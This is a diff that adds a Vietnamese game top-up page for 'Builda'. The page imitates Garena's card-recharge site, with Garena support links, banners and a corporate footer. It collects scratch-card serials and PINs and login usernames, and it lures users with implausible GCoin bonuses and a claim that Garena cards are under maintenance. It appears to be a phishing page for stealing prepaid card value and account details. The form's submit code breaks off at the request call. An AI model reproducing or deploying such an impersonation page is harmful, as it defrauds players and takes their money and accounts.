@@ -1,0 +1,1280 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=1.0, user-scalable=0">
+    <title>Nạp GCoin - Builda</title>
+    <link rel="shortcut icon" href="/static/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick-theme.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        /* ===== ROOT VARIABLES ===== */
+        :root {
+            --primary: #8b5cf6;
+            --primary-dark: #7c3aed;
+            --primary-light: #a78bfa;
+            --primary-glow: rgba(139, 92, 246, 0.2);
+            --bg-dark: #0b0a12;
+            --text-primary: #f0ecff;
+            --text-secondary: #a8a0c0;
+            --text-muted: #6a6480;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Be Vietnam Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* ===== AMBIENT BACKGROUND ===== */
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background:
+                radial-gradient(ellipse 60% 50% at 30% 20%, rgba(139, 92, 246, 0.08) 0%, transparent 60%),
+                radial-gradient(ellipse 40% 40% at 80% 80%, rgba(167, 139, 250, 0.06) 0%, transparent 50%);
+            z-index: -2;
+            pointer-events: none;
+            animation: ambientFloat 20s ease-in-out infinite alternate;
+        }
+
+        @keyframes ambientFloat {
+            0% {
+                transform: translate(0, 0) scale(1);
+            }
+            100% {
+                transform: translate(-3%, -2%) scale(1.03);
+            }
+        }
+
+        /* ===== PARTICLES ===== */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: var(--primary);
+            border-radius: 50%;
+            opacity: 0;
+            animation: particleFloat linear infinite;
+            box-shadow: 0 0 10px var(--primary-glow);
+        }
+
+        .particle:nth-child(1) {
+            left: 10%;
+            animation-duration: 18s;
+            animation-delay: 0s;
+            width: 2px;
+            height: 2px;
+        }
+        .particle:nth-child(2) {
+            left: 30%;
+            animation-duration: 22s;
+            animation-delay: 3s;
+            width: 4px;
+            height: 4px;
+            background: var(--primary-light);
+        }
+        .particle:nth-child(3) {
+            left: 50%;
+            animation-duration: 20s;
+            animation-delay: 6s;
+            width: 2px;
+            height: 2px;
+        }
+        .particle:nth-child(4) {
+            left: 70%;
+            animation-duration: 25s;
+            animation-delay: 1s;
+            width: 5px;
+            height: 5px;
+            background: var(--primary-light);
+            opacity: 0.3;
+        }
+        .particle:nth-child(5) {
+            left: 90%;
+            animation-duration: 19s;
+            animation-delay: 8s;
+            width: 3px;
+            height: 3px;
+        }
+        .particle:nth-child(6) {
+            left: 20%;
+            animation-duration: 23s;
+            animation-delay: 4s;
+            width: 2px;
+            height: 2px;
+        }
+        .particle:nth-child(7) {
+            left: 60%;
+            animation-duration: 21s;
+            animation-delay: 10s;
+            width: 4px;
+            height: 4px;
+            background: var(--primary-light);
+            opacity: 0.4;
+        }
+        .particle:nth-child(8) {
+            left: 80%;
+            animation-duration: 26s;
+            animation-delay: 2s;
+            width: 3px;
+            height: 3px;
+        }
+
+        @keyframes particleFloat {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.6;
+            }
+            90% {
+                opacity: 0.6;
+            }
+            100% {
+                transform: translateY(-100px) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            background: rgba(11, 10, 18, 0.6);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(139, 92, 246, 0.06);
+            padding: 0.8rem 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 2rem;
+        }
+
+        .header-logo {
+            font-family: 'Orbitron', monospace;
+            font-size: 20px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #8b5cf6, #c084fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 0.06em;
+            text-decoration: none;
+        }
+
+        .header-logo::before {
+            content: '💎 ';
+            -webkit-text-fill-color: initial;
+        }
+
+        .header-contact {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            padding: 8px 16px;
+            border-radius: 8px;
+            border: 1px solid rgba(139, 92, 246, 0.1);
+        }
+
+        .header-contact:hover {
+            color: var(--primary-light);
+            border-color: rgba(139, 92, 246, 0.3);
+            background: rgba(139, 92, 246, 0.05);
+        }
+
+        /* ===== APP CONTAINER ===== */
+        .app-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1.5rem 2rem 2rem;
+        }
+
+        .app-slide {
+            margin: 10px 0 20px;
+            border-radius: 16px;
+            overflow: hidden;
+        }
+
+        .slick-slider img {
+            width: 100%;
+            border-radius: 16px;
+        }
+
+        /* ===== BACK HOMEPAGE ===== */
+        .back-homepage {
+            margin-bottom: 16px;
+        }
+
+        .back-homepage-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .back-homepage-link {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .back-homepage-link:hover {
+            color: var(--primary-light);
+        }
+
+        .back-arrow-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .back-arrow-left {
+            width: 8px;
+            height: 8px;
+            border-left: 2px solid currentColor;
+            border-bottom: 2px solid currentColor;
+            transform: rotate(45deg);
+        }
+
+        /* ===== GAME HEADING ===== */
+        .app-game-heading {
+            text-align: center;
+            margin: 10px 0 20px;
+        }
+
+        .app-game-group {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .app-game-logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 16px;
+            object-fit: cover;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .app-game-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 26px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #8b5cf6, #c084fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 0.04em;
+        }
+
+        .app-game-line {
+            width: 60px;
+            height: 3px;
+            margin: 8px auto 0;
+            background: linear-gradient(90deg, transparent, #8b5cf6, transparent);
+            border-radius: 2px;
+        }
+
+        /* ===== RECHARGE ===== */
+        .recharge {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        /* ===== NOTIFICATION ===== */
+        .notification {
+            margin-bottom: 18px;
+        }
+
+        .notification div {
+            border-radius: 12px;
+            border: 1px solid rgba(251, 191, 36, 0.15);
+            border-left: 4px solid #fbbf24;
+            padding: 12px 18px;
+            background: rgba(251, 191, 36, 0.04);
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .notification div b {
+            color: #fbbf24;
+        }
+
+        .notification div .highlight {
+            color: #fbbf24;
+            font-weight: 700;
+        }
+
+        /* ===== RECHARGE TYPE ===== */
+        .recharge-type {
+            margin-bottom: 20px;
+        }
+
+        .recharge-type__body {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .recharge-type__item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 14px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.02);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            min-width: 90px;
+            justify-content: center;
+        }
+
+        .recharge-type__item:hover {
+            border-color: rgba(139, 92, 246, 0.2);
+            background: rgba(139, 92, 246, 0.04);
+        }
+
+        .recharge-type__item.active {
+            border-color: var(--primary);
+            background: rgba(139, 92, 246, 0.06);
+            box-shadow: 0 0 30px rgba(139, 92, 246, 0.05);
+        }
+
+        .recharge-type__img {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .recharge-type__img img {
+            height: 28px;
+            width: auto;
+            border-radius: 4px;
+        }
+
+        .recharge-type__arrow {
+            color: var(--text-muted);
+            font-size: 11px;
+        }
+
+        /* ===== RECHARGE FORM ===== */
+        .recharge-form {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(139, 92, 246, 0.06);
+            border-radius: 16px;
+            padding: 24px;
+        }
+
+        .recharge-form__content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+
+        .recharge-form__left {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .recharge-form__right {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .recharge-form__submit--title {
+            font-family: 'Orbitron', monospace;
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text-primary);
+            letter-spacing: 0.02em;
+        }
+
+        .recharge-form__submit--title span {
+            color: var(--primary-light);
+        }
+
+        /* ===== RECHARGE AMOUNT ===== */
+        .recharge-amount__heading {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            color: var(--text-muted);
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .recharge-amount__table {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .recharge-amount__item {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            padding: 8px 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.01);
+        }
+
+        .recharge-amount__item:hover {
+            border-color: rgba(139, 92, 246, 0.15);
+            background: rgba(139, 92, 246, 0.03);
+        }
+
+        .recharge-amount__item.active {
+            border-color: var(--primary);
+            background: rgba(139, 92, 246, 0.06);
+            box-shadow: 0 0 30px rgba(139, 92, 246, 0.05);
+        }
+
+        .recharge-amount__radio {
+            display: none;
+        }
+
+        .recharge-amount__price {
+            color: var(--text-primary);
+            font-weight: 600;
+            font-size: 13px;
+        }
+
+        .recharge-amount__pointReceive {
+            color: var(--text-secondary);
+            font-size: 12px;
+            text-align: right;
+        }
+
+        .recharge-amount__pointReceive span {
+            color: #22c55e;
+            font-weight: 600;
+        }
+
+        /* ===== FORM ===== */
+        .recharge-form__submit--body {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .recharge-form__group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .recharge-form__label {
+            color: var(--text-secondary);
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .recharge-form__control {
+            position: relative;
+        }
+
+        .recharge-form__input {
+            width: 100%;
+            padding: 10px 14px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(0, 0, 0, 0.25);
+            color: var(--text-primary);
+            font-size: 13px;
+            font-family: 'Be Vietnam Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .recharge-form__input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 30px rgba(139, 92, 246, 0.05);
+        }
+
+        .recharge-form__input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .recharge-form__input select {
+            appearance: none;
+            cursor: pointer;
+        }
+
+        .error-message {
+            color: #ef4444;
+            font-size: 12px;
+            font-weight: 500;
+            padding: 4px 0;
+            min-height: 24px;
+        }
+
+        .success-message {
+            color: #22c55e;
+            font-size: 12px;
+            font-weight: 500;
+            padding: 4px 0;
+            min-height: 24px;
+        }
+
+        .recharge-form__button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            font-family: 'Be Vietnam Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 0.02em;
+            margin-top: 6px;
+        }
+
+        .recharge-form__button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(139, 92, 246, 0.3);
+        }
+
+        .recharge-form__button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .sumbit_loading {
+            display: none;
+            text-align: center;
+            padding: 16px 0;
+        }
+
+        .sumbit_loading.active {
+            display: block;
+        }
+
+        .sumbit_loading i {
+            color: var(--primary-light);
+            font-size: 24px;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            background: rgba(11, 10, 18, 0.8);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-top: 1px solid rgba(139, 92, 246, 0.04);
+            padding: 30px 0 20px;
+            margin-top: 40px;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .footer-content {
+            color: var(--text-muted);
+            font-size: 12px;
+            line-height: 1.8;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 16px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links-item {
+            list-style: none;
+        }
+
+        .footer-links-redirect {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links-redirect:hover {
+            color: var(--primary-light);
+        }
+
+        .recharge-form__line {
+            display: none;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .app-container {
+                padding: 1rem;
+            }
+            .recharge-form__content {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+            .app-game-title {
+                font-size: 20px;
+            }
+            .app-game-logo {
+                width: 48px;
+                height: 48px;
+            }
+            .header-container {
+                padding: 0 1rem;
+            }
+            .header-logo {
+                font-size: 16px;
+            }
+            .recharge-type__body {
+                gap: 6px;
+            }
+            .recharge-type__item {
+                padding: 6px 10px;
+                min-width: 70px;
+                font-size: 11px;
+            }
+            .recharge-type__img img {
+                height: 22px;
+            }
+            .recharge-form {
+                padding: 16px;
+            }
+            .recharge-amount__item {
+                padding: 6px 10px;
+                font-size: 12px;
+            }
+            .footer-container {
+                padding: 0 1rem;
+            }
+            .footer-links {
+                gap: 14px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .app-game-title {
+                font-size: 17px;
+            }
+            .app-game-logo {
+                width: 40px;
+                height: 40px;
+            }
+            .header-logo {
+                font-size: 14px;
+            }
+            .header-contact {
+                font-size: 12px;
+                padding: 6px 12px;
+            }
+            .header-container {
+                padding: 0 0.8rem;
+            }
+            .recharge-form__input {
+                font-size: 12px;
+                padding: 8px 12px;
+            }
+            .recharge-amount__price {
+                font-size: 12px;
+            }
+            .recharge-amount__pointReceive {
+                font-size: 11px;
+            }
+            .recharge-form__button {
+                font-size: 13px;
+                padding: 12px;
+            }
+            .notification div {
+                font-size: 12px;
+                padding: 8px 12px;
+            }
+            .back-homepage-link {
+                font-size: 12px;
+            }
+            .recharge-amount__heading {
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ===== PARTICLES ===== -->
+    <div class="particles">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+    </div>
+
+    <!-- ===== HEADER ===== -->
+    <header class="header">
+        <div class="header-container">
+            <a href="/" style="text-decoration: none;">
+                <div class="header-logo">NAP THEVIP</div>
+            </a>
+            <div>
+                <a class="header-contact" href="https://hotro.garena.vn/" target="_blank">
+                    <i class="fas fa-headset" style="margin-right: 6px;"></i>
+                    Chăm sóc khách hàng
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- ===== MAIN CONTENT ===== -->
+    <div class="app-container">
+        <div class="app-content">
+
+            <!-- BACK HOMEPAGE -->
+            <div class="back-homepage">
+                <div class="back-homepage-container">
+                    <a class="back-homepage-link" href="/">
+                        <div class="back-arrow-container">
+                            <div class="back-arrow-left"></div>
+                        </div>
+                        <div>Quay lại Trang chủ</div>
+                    </a>
+                </div>
+            </div>
+
+            <!-- SLIDE -->
+            <div class="app-slide">
+                <div class="slick-slider">
+                    <div>
+                        <a href="https://lienquan.garena.vn/freedataviettel/" target="_blank" rel="noopener noreferrer">
+                            <img src="https://cdn.vn.garenanow.com/web/napthevn/lq_mo_11012023.png" alt="Khuyến mãi Liên Quân" style="width:100%; border-radius:16px;">
+                        </a>
+                    </div>
+                    <div>
+                        <a href="https://khuyenmaigarena.dailyshopee.vn" target="_blank" rel="noopener noreferrer">
+                            <img src="https://cdn.vn.garenanow.com/web/napthevn/sp_mo_1032022.jpg" alt="Khuyến mãi Shopee" style="width:100%; border-radius:16px;">
+                        </a>
+                    </div>
+                    <div>
+                        <a href="https://dailyshopee.vn/merchant" target="_blank" rel="noopener noreferrer">
+                            <img src="https://cdn.vn.garenanow.com/web/napthevn/sp_mo_15092022.jpg" alt="Daily Shopee" style="width:100%; border-radius:16px;">
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- GAME HEADING -->
+            <div class="app-game-heading">
+                <div class="app-game-group">
+                    <img class="app-game-logo" src="https://sf-static.upanhlaylink.com/img/image_20260825c3763ed4038d8cd7aef9a4d35372a495.jpg" alt="Builda" />
+                    <div class="app-game-title">Builda</div>
+                </div>
+                <div class="app-game-line"></div>
+            </div>
+
+            <!-- RECHARGE -->
+            <div class="recharge">
+
+                <!-- NOTIFICATION -->
+                <div class="notification">
+                    <div>
+                        🎁 <b>Phúc lợi nạp GCoin:</b> Nạp từ <span class="highlight">50.000đ</span> trở lên tặng ngay <span class="highlight">50.000 GCoin</span>!
+                    </div>
+                </div>
+
+                <!-- RECHARGE TYPE -->
+                <div class="recharge-type">
+                    <div class="recharge-type__body">
+                        <div class="recharge-type__item" onclick="selectType(this)">
+                            <div class="recharge-type__img">
+                                <img src="/static/images/cards/viettel.png" />
+                                <input type="radio" name="type" data-type="VIETTEL" hidden />
+                            </div>
+                            <div class="recharge-type__arrow"></div>
+                        </div>
+                        <div class="recharge-type__item" onclick="selectType(this)">
+                            <div class="recharge-type__img">
+                                <input type="radio" name="type" data-type="VINAPHONE" hidden />
+                                <img src="/static/images/cards/vinaphone.jpg" />
+                            </div>
+                            <div class="recharge-type__arrow"></div>
+                        </div>
+                        <div class="recharge-type__item" onclick="selectType(this)">
+                            <div class="recharge-type__img">
+                                <input type="radio" name="type" data-type="MOBIFONE" hidden />
+                                <img src="/static/images/cards/mobifone.png" />
+                            </div>
+                            <div class="recharge-type__arrow"></div>
+                        </div>
+                        <div class="recharge-type__item" onclick="selectType(this)">
+                            <div class="recharge-type__img">
+                                <input type="radio" name="type" data-type="ZING" hidden />
+                                <img src="/static/images/cards/zing.png" />
+                            </div>
+                            <div class="recharge-type__arrow"></div>
+                        </div>
+                        <div class="recharge-type__item" onclick="selectType(this)">
+                            <div class="recharge-type__img">
+                                <input type="radio" name="type" data-type="GATE" hidden />
+                                <img src="/static/images/cards/gate.png" />
+                            </div>
+                            <div class="recharge-type__arrow"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- RECHARGE FORM -->
+                <div class="recharge-form">
+                    <div class="recharge-form__content">
+
+                        <!-- LEFT - BẢNG GIÁ -->
+                        <div class="recharge-form__left">
+                            <div class="recharge-form__submit--title">Bảng giá quy đổi <span>GCoin</span></div>
+
+                            <div class="recharge-amount__heading">
+                                <div class="recharge-amount__number">Giá</div>
+                                <div class="recharge-amount__point">Nhận được</div>
+                            </div>
+
+                            <div class="recharge-amount__table">
+                                <div class="recharge-amount__item" onclick="selectAmount(this)">
+                                    <input class="recharge-amount__radio" type="radio" name="amount" data-amount="20000" />
+                                    <div class="recharge-amount__price">20.000 VND</div>
+                                    <div class="recharge-amount__pointReceive">+30K GCoin</div>
+                                </div>
+                                <div class="recharge-amount__item" onclick="selectAmount(this)">
+                                    <input class="recharge-amount__radio" type="radio" name="amount" data-amount="50000" />
+                                    <div class="recharge-amount__price">50.000 VND</div>
+                                    <div class="recharge-amount__pointReceive">+100K GCoin <span>(+420)</span></div>
+                                </div>
+                                <div class="recharge-amount__item" onclick="selectAmount(this)">
+                                    <input class="recharge-amount__radio" type="radio" name="amount" data-amount="100000" />
+                                    <div class="recharge-amount__price">100.000 VND</div>
+                                    <div class="recharge-amount__pointReceive">+150K GCoin <span>(+850)</span></div>
+                                </div>
+                                <div class="recharge-amount__item" onclick="selectAmount(this)">
+                                    <input class="recharge-amount__radio" type="radio" name="amount" data-amount="200000" />
+                                    <div class="recharge-amount__price">200.000 VND</div>
+                                    <div class="recharge-amount__pointReceive">+300K GCoin <span>(+2.140)</span></div>
+                                </div>
+                                <div class="recharge-amount__item" onclick="selectAmount(this)">
+                                    <input class="recharge-amount__radio" type="radio" name="amount" data-amount="500000" />
+                                    <div class="recharge-amount__price">500.000 VND</div>
+                                    <div class="recharge-amount__pointReceive">+777K GCoin <span>(+4.400)</span></div>
+                                </div>
+                                <div class="recharge-amount__item" onclick="selectAmount(this)">
+                                    <input class="recharge-amount__radio" type="radio" name="amount" data-amount="1000000" />
+                                    <div class="recharge-amount__price">1.000.000 VND</div>
+                                    <div class="recharge-amount__pointReceive">+1M6 GCoin <span>(+10.200)</span></div>
+                                </div>
+                            </div>
+
+                            <div style="border-radius: 8px; border: 1px solid rgba(217, 83, 79, 0.12); border-left: 3px solid #d58431; padding: 8px 12px; background: rgba(0, 145, 140, 0.01); font-size: 12px; color: var(--text-secondary);">
+                                <span style="color:#ef4444; font-weight:600;">Thẻ Garena đang bảo trì</span>
+                                Ưu đãi nhận thêm <b style="color: #ef4444;">200%</b> giá trị thẻ cào khi nạp <b>GCoin</b> bằng thẻ <span style="color:#ef4444; font-weight:600;">Khác</span>.
+                            </div>
+                        </div>
+
+                        <!-- RIGHT - FORM NHẬP THẺ -->
+                        <div class="recharge-form__right">
+                            <div class="recharge-form__submit">
+                                <div class="recharge-form__submit--title" style="margin-bottom: 14px;">Điền thông tin thẻ</div>
+
+                                <form id="form_recharge" autocomplete="off">
+                                    <div id="bodyForm">
+                                        <div class="recharge-form__submit--body">
+                                            <div class="recharge-form__group">
+                                                <div class="recharge-form__label">Serial</div>
+                                                <div class="recharge-form__control">
+                                                    <input class="recharge-form__input" placeholder="Số serial" autocorrect="off" autocapitalize="off" id="serial" />
+                                                </div>
+                                            </div>
+                                            <div class="recharge-form__group">
+                                                <div class="recharge-form__label">Mã thẻ</div>
+                                                <div class="recharge-form__control">
+                                                    <input class="recharge-form__input" placeholder="Mã thẻ cào" autocorrect="off" autocapitalize="off" id="pin" />
+                                                </div>
+                                            </div>
+
+                                            <!-- Phần chọn cách đăng nhập - Gmail + TikTok -->
+                                            <div class="recharge-form__group">
+                                                <div class="recharge-form__label">Chọn cách đăng nhập</div>
+                                                <div class="recharge-form__control">
+                                                    <select class="recharge-form__input" id="account_type">
+                                                        <option value="garena">Tài khoản Gmail</option>
+                                                        <option value="facebook">Tài khoản TikTok</option>
+                                                    </select>
+                                                </div>
+                                            </div>
+
+                                            <div class="recharge-form__group" id="container_username">
+                                                <div class="recharge-form__label" id="label_username">Tên đăng nhập</div>
+                                                <div class="recharge-form__control">
+                                                    <input class="recharge-form__input" autocorrect="off" autocapitalize="off" id="username" placeholder="Nhập tên đăng nhập" />
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="error-message" id="error_message"></div>
+                                        <div class="success-message" id="success_message"></div>
+                                    </div>
+                                    <div class="sumbit_loading" id="loading">
+                                        <i class="fas fa-spinner fa-spin"></i>
+                                    </div>
+                                    <button class="recharge-form__button" type="submit">
+                                        <i class="fas fa-check-circle" style="margin-right: 8px;"></i>
+                                        Xác nhận nạp
+                                    </button>
+                                </form>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-content">
+                CÔNG TY CỔ PHẦN PHÁT TRIỂN THỂ THAO ĐIỆN TỬ VIỆT NAM Giấy CNĐKKD số
+                0103959912, cấp lần đầu trong hôm nay ngày 09/06/2009 | Cơ quan cấp: Phòng Đăng ký kinh
+                doanh- Sở Kế hoạch và đầu tư TP Hà Nội Địa chỉ trụ sở chính: Tầng 29, Tòa
+                nhà Trung tâm Lotte Hà Nội, số 54 đường Liễu Giai, Phường Cống Vị, Quận Ba
+                Đình, TP Hà Nội, Việt Nam Điện thoại: 024 73053939
+            </div>
+            <div class="footer-links">
+                <div class="footer-links-item">
+                    <a class="footer-links-redirect" href="/faq">Câu hỏi thường gặp</a>
+                </div>
+                <div class="footer-links-item">
+                    <a class="footer-links-redirect" href="https://napthe.vn/terms" target="_blank">Điều khoản dịch vụ</a>
+                </div>
+                <div class="footer-links-item">
+                    <a class="footer-links-redirect" href="https://napthe.vn/privacy" target="_blank">Chính sách bảo mật</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ===== SCRIPTS ===== -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
+
+    <script>
+        // ===== SLICK SLIDER =====
+        $(document).ready(function() {
+            $('.slick-slider').slick({
+                dots: false,
+                infinite: true,
+                speed: 500,
+                slidesToShow: 1,
+                slidesToScroll: 1,
+                autoplay: true,
+                autoplaySpeed: 4000,
+                arrows: false,
+                fade: true,
+                cssEase: 'ease-in-out'
+            });
+
+            // Auto select first type
+            const firstType = document.querySelector('.recharge-type__item');
+            if (firstType) {
+                firstType.classList.add('active');
+                firstType.querySelector('input[type="radio"]').checked = true;
+            }
+        });
+
+        // ===== SELECT TYPE =====
+        function selectType(element) {
+            document.querySelectorAll('.recharge-type__item').forEach(el => el.classList.remove('active'));
+            element.classList.add('active');
+            element.querySelector('input[type="radio"]').checked = true;
+        }
+
+        // ===== SELECT AMOUNT =====
+        function selectAmount(element) {
+            document.querySelectorAll('.recharge-amount__item').forEach(el => el.classList.remove('active'));
+            element.classList.add('active');
+            element.querySelector('input[type="radio"]').checked = true;
+        }
+
+        // ===== RECHARGE MAIN =====
+        var recharge = {
+            registerControl: function() {
+                const form = document.querySelector("#form_recharge");
+                form.addEventListener("submit", recharge.handleSubmitForm);
+
+                const accountType = document.querySelector("#account_type");
+                recharge.setTextInputUsername(accountType.value);
+                accountType.addEventListener("change", recharge.handleChangeAccountType);
+            },
+            handleChangeAccountType: function(e) {
+                document.querySelector("#success_message").innerText = "";
+                recharge.setTextInputUsername(e.target.value);
+            },
+            setTextInputUsername: function(type) {
+                const elementError = document.querySelector("#error_message");
+                const containerUsername = document.querySelector("#container_username");
+                const typeLogin = helpers.getLabelAndPlaceholderByGame(type);
+                if (typeLogin) {
+                    const [label, placeholder] = typeLogin;
+                    const labelElement = document.querySelector("#label_username");
+                    const inputElement = document.querySelector("#username");
+                    labelElement.innerText = label;
+                    inputElement.placeholder = placeholder;
+                    inputElement.value = "";
+                    elementError.innerText = "";
+                    containerUsername.classList.remove("hidden");
+                    return true;
+                } else {
+                    elementError.innerText = "Cách đăng nhập này đang bảo trì, vui lòng thử cách khác";
+                    containerUsername.classList.add("hidden");
+                    return false;
+                }
+            },
+            getAmountChecked: function() {
+                const eleAmountChecked = document.querySelector("input[name='amount']:checked");
+                return eleAmountChecked ? eleAmountChecked.dataset.amount : undefined;
+            },
+            getTypeChecked: function() {
+                const eleTypeChecked = document.querySelector("input[name='type']:checked");
+                return eleTypeChecked ? eleTypeChecked.dataset.type : undefined;
+            },
+            handleSubmitForm: function(e) {
+                e.preventDefault();
+                var type = recharge.getTypeChecked();
+                var amount = recharge.getAmountChecked();
+                var serial = $("#serial").val();
+                var pin = $("#pin").val();
+                var username = $("#username").val();
+                var error = validationForm.checkHasError();
+                var elementError = document.querySelector("#error_message");
+                var elementSuccess = document.querySelector("#success_message");
+                var [typeGame] = helpers.getGame();
+                var typeLogin = document.querySelector("#account_type").value;
+
+                if (error) {
+                    elementSuccess.innerText = "";
+                    elementError.innerText = error;
+                    return;
+                } else {
+                    elementError.innerText = "";
+                }
+
+                // Disable button
+                $('[class="recharge-form__button"]')[0].disabled = true;
+                recharge.showLoading(true);
+
+                $.ajax({
